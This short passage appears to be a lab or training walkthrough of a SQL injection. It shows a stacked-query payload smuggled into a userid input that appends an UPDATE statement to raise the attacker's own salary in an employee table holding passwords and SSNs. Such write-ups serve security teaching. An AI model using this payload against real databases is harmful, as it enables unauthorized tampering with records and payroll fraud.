We begin by query our own data, the SQL command is 

select userid, password, ssn, salary, email from employee where userid=INPUT

We now insert another command after this to update our own salary

INPUT = "1 and 'a'='b' update employee set salary=999999 where userid=101"

The resulting command is 

select userid, password, ssn, salary, email from employee where userid=1 and 'a'='b' update employee set salary=999999 where userid=101

This statement effectvely updates our salary to a higher value
